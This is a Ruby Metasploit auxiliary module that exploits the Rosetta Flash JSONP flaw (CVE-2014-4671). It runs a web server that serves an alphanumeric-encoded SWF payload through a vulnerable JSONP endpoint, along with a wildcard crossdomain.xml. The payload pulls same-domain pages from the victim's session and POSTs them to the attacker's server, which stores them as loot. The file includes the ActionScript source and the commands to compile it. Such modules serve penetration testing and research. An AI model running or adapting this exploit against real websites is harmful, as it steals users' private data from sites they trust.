##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'uri'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Flash "Rosetta" JSONP GET/POST Response Disclosure',
      'Description'    => %q{
        A website that serves a JSONP endpoint that accepts a custom alphanumeric
        callback of 1200 chars can be abused to serve an encoded swf payload that
        steals the contents of a same-domain URL. Flash < 14.0.0.145 is required.

        This module spins up a web server that, upon navigation from a user, attempts
        to abuse the specified JSONP endpoint URLs by stealing the response from
        GET requests to STEAL_URLS.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'Michele Spagnuolo', # discovery, wrote rosetta encoder, disclosure
        'joev' # metasploit module
      ],
      'References'     =>
        [
          ['CVE', '2014-4671'],
          ['URL', 'http://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/'],
          ['URL', 'https://github.com/mikispag/rosettaflash'],
          ['URL', 'http://quaxio.com/jsonp_handcrafted_flash_files/']
        ],
      'DisclosureDate' => 'Jul 8 2014',
      'Actions'        => [ [ 'WebServer' ] ],
      'PassiveActions' => [ 'WebServer' ],
      'DefaultAction'  => 'WebServer'))

    register_options(
      [
        OptString.new('CALLBACK', [ true, 'The name of the callback paramater', 'callback' ]),
        OptString.new('JSONP_URL', [ true, 'The URL of the vulnerable JSONP endpoint', '' ]),
        OptBool.new('CHECK', [ true, 'Check first that the JSONP endpoint works', true ]),
        OptString.new('STEAL_URLS', [ true, 'A comma-separated list of URLs to steal', '' ]),
        OptString.new('URIPATH', [ true, 'The URI path to serve the exploit under', '/' ])
      ],
      self.class)
  end

  def run
    if datastore['CHECK'] && check == Msf::Exploit::CheckCode::Safe
      raise "JSONP endpoint does not allow sufficiently long callback names."
    end

    unless datastore['URIPATH'] == '/'
      raise "URIPATH must be set to '/' to intercept crossdomain.xml request."
    end

    exploit
  end

  def check
    test_string = Rex::Text.rand_text_alphanumeric(encoded_swf.length)
    io = URI.parse(exploit_url(test_string)).open
    if io.read.start_with? test_string
      Msf::Exploit::CheckCode::Vulnerable
    else
      Msf::Exploit::CheckCode::Safe
    end
  end

  def on_request_uri(cli, request)
    vprint_status("Request '#{request.method} #{request.uri}'")
    if request.uri.end_with? 'crossdomain.xml'
      print_status "Responding to crossdomain request.."
      send_response(cli, crossdomain_xml, 'Content-type' => 'text/x-cross-domain-policy')
    elsif request.uri.end_with? '.log'
      body = URI.decode(request.body)
      file = store_loot(
        "html", "text/plain", cli.peerhost, body, "flash_jsonp_rosetta", "Exfiltrated HTTP response"
      )
      url = body.lines.first.gsub(/.*?=/,'')
      print_good "#{body.length} bytes captured from target #{cli.peerhost} on URL:\n#{url}"
      print_good "Stored in #{file}"
    else
      print_status "Serving exploit HTML"
      send_response_html(cli, exploit_html)
    end
  end

  def exploit_url(data_payload)
    delimiter = if datastore['JSONP_URL'].include?('?') then '&' else '?' end
    "#{datastore['JSONP_URL']}#{delimiter}#{datastore['CALLBACK']}=#{data_payload}"
  end

  def exploit_html
    ex_url = URI.escape(get_uri.chomp('/')+'/'+Rex::Text.rand_text_alphanumeric(6+rand(20))+'.log')
    %Q|
      <!doctype html>
      <html>
        <body>
          <object type="application/x-shockwave-flash" data="#{exploit_url(encoded_swf)}"
            width=500 height=500>
            <param name="FlashVars"
              value="url=#{URI.escape datastore['STEAL_URLS']}&exfiltrate=#{ex_url}" />
          </object>
        </body>
      </html>
    |
  end

  # Based off of http://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/
  #
  # Alphanumeric Flash swf applet that steals URLs. Compiled from the following code:
  #
  # class X {
  #   static var app : X;
  #
  #   function getURL(url:String) {
  #     var r:LoadVars = new LoadVars();
  #     r.onData = function(src:String) {
  #       if (_root.exfiltrate) {
  #         var w:LoadVars = new LoadVars();
  #         w.x = url+"\n"+src;
  #         w.sendAndLoad(_root.exfiltrate, w, "POST");
  #       }
  #     }
  #     r.load(url, r, "GET");
  #   }
  #
  #   function X(mc) {
  #     if (_root.url) {
  #       var urls:Array = _root.url.split(",");
  #       for (var i in urls) {
  #         getURL(urls[i]);
  #       }
  #     }
  #   }
  #
  #   // entry point
  #   static function main(mc) {
  #     app = new X(mc);
  #   }
  # }
  #
  #
  #  Compiling the .as using mtasc and swftool:
  #
  #  > mtasc.exe -swf out.swf -main -header 800:600:20 exploit.as
  #  $ swfcombine -d out.swf -o out-uncompressed.swf
  #  $ rosettaflash --input out-uncompressed.swf --output out-ascii.swf
  #
  def encoded_swf
    "CWSMIKI0hCD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7iiudIbEAt333swW0s" \
    "sG03sDDtDDDt0333333Gt333swwv3wwwFPOHtoHHvwHHFhH3D0Up0IZUnnnnnnnnnnnn" \
    "nnnnnnnUU5nnnnnn3Snn7YNqdIbeUUUfV13333sDT133333333WEDDT13s03WVqefXAx" \
    "oookD8f8888T0CiudIbEAt33swwWpt03sDGDDDwwwtttttwwwGDt33333www033333Gf" \
    "BDRhHHUccUSsgSkKoe5D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7mNqdIbe1" \
    "WUUfV133sUUpDDUUDDUUDTUEDTEDUTUE0GUUD133333333sUEe1sfzA87TLx888znN8t" \
    "8F8fV6v0CiudIbEAtwwWDt03sDG0sDtDDDtwwtGwpttGwwt33333333w0333GDfBDFzA" \
    "HZYqqEHeYAHtHyIAnEHnHNVEJRlHIYqEqEmIVHlqzfjzYyHqQLzEzHVMvnAEYzEVHMHT" \
    "HbB2D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtwuDtDtDDtpDGpD" \
    "DG0sDtwtwDDGDGtGpDDGwG33sptDDDtGDD33333s03sdFPZHyVQflQfrqzfHRBZHAqzf" \
    "HaznQHzIIHljjVEJYqIbAzvyHwXHDHtTToXHGhwXHDhtwXHDHWdHHhHxLHXaFHNHwXHD" \
    "Xt7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7iiudIbEAt333wwE0GDtwpDtD" \
    "DGDGtG033sDDwGpDDGtDt033sDDt3333g3sFPXHLxcZWXHKHGlHLDthHHHLXAGXHLxcG" \
    "XHLdSkhHxvGXHDxskhHHGhHXCWXHEHGDHLTDHmGDHDxLTAcGlHthHHHDhLtSvgXH7D0U" \
    "p0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7YNqdIbeV133333333333333333gF03" \
    "sDeqUfzAoE80CiudIbEAtwwW3sD3w0sDt0wwGDDGpDtptDDtGwwGpDDtDDDGDDD33333" \
    "sG033gFPHHmODHDHttMWhHhVODHDhtTwBHHhHxUHHksSHoHOTHTHHHHtLuWhHXVODHDX" \
    "tlwBHHhHDUHXKscHCHOXHtXnOXH4D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn" \
    "7CiudIbEAtwwuwG333spDtDDGDDDt0333st0GGDDt33333www03sdFPlWJoXHgHOTHTH" \
    "HHHtLGwhHxfOdHDx4D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtu" \
    "wttD333swG0wDDDw03333sDt33333sG03sDDdFPtdXvwhHdLGwhHxhGWwDHdlxXdhvwh" \
    "HdTg7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAt333swwE03GDtD" \
    "wG0wpDG03sGDDD33333sw033gFPlHtxHHHDxLrkvKwTHLJDXLxAwlHtxHHHDXLjkvKwD" \
    "HDHLZWBHHhHxmHXgGHVHwXHLHA7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7" \
    "CiudIbEAtsWt3wGww03GDttwtDDtDtwDwGDwGDttDDDwDtwwtG0GDtGpDDt33333www0" \
    "33GdFPlHLjDXthHHHLHqeeobHthHHHXDhtxHHHLZafHQxQHHHOvHDHyMIuiCyIYEHWSs" \
    "gHmHKcskHoXHLHwhHHfoXHLhnotHthHHHLXnoXHLxUfH1D0Up0IZUnnnnnnnnnnnnnnn" \
    "nnnnUU5nnnnnn3SnnwWNqdIbe133333333333333333WfF03sTeqefXA888ooo04Cx9"
  end

  def crossdomain_xml
    %Q|
      <?xml version="1.0" ?>
      <cross-domain-policy>
      <allow-access-from domain="*" />
      </cross-domain-policy>
    |
  end

  def rhost
    URI.parse(datastore["JSONP_URL"]).host
  end
end
